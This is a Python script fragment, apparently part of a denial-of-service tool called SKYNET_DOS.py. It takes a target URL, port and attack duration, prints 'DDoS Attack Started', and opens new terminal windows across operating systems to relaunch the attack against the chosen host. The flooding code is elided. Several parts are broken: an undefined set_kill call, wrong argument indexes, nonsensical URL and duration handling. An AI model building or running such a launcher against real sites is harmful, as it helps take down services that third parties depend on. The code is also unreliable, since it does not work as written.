import threading
import time
import random
import re
from urllib.request import urlopen
from urllib.error import URLError, HTTPError
import subprocess
import os
import platform

# Function to print usage information
def usage():
    print("\033[91m" + "-" * 51)
    print("USAGE: SKYNET_DOS.py <url> [port] [attack_duration]")
    print("-" * 51 + "\033[0m")

# ... (rest of your DDoS attack script)

# Function to open a new terminal and run the DDoS attack script
def open_new_terminal(command):
    system = platform.system()

    if system == "Linux":
        # For Linux, you can use xterm
        subprocess.Popen(["xterm", "-e", command])
    elif system == "Windows":
        # For Windows, you might use start with cmd
        subprocess.Popen(["start", "cmd", "/c", command])
    elif system == "Darwin":
        # For macOS, you can use open -a Terminal
        subprocess.Popen(["open", "-a", "Terminal", command])
    else:
        print("Unsupported operating system")

# ... (rest of your DDoS attack script)

if __name__ == "__main__":
    import sys

    # Default values
    url = ""
    port = 80
    attack_duration = 99000000.0 * 24 * 365  # Default attack duration

    if len(sys.argv) < 2:
        usage()
        sys.exit(0)
    elif sys.argv[1].lower() == "help":
        usage()
        sys.exit(0)
    else:
        print("-- DDoS Attack Started --")
        if len(sys.argv) >= 4:
            port = int(sys.argv[3])
        if len(sys.argv) >= 5:
            attack_duration = float(sys.argv[4]) * 24 * 365  # Convert attack duration to hours
        if len(sys.argv) >= 6:
            if sys.argv[5].lower() == "kill":
                set_kill()
        url = sys.argv[1]
        print(f"Target URL: {url}, Port: {port}, Attack Duration: {attack_duration} hours")  # Add this line for debugging
        if "/" in url:
            url += "/"
        pattern = "http://([^/:]*)[:/]?.*"
        regex_pattern = re.compile(pattern)
        matcher = regex_pattern.match(url)
        if matcher:
            host = matcher.group(1)
        else:
            print("Error: Unable to extract host from URL.")
            sys.exit(0)
        
        # Open a new terminal and run SKYNET_DOS.py
        script_path = os.path.abspath("SKYNET_DOS.py")  # Update with the actual script name
        open_new_terminal(f"python {script_path} {url} {port} {attack_duration}")

        # Continue with the rest of your main script
        print("-- Main script continues here --")
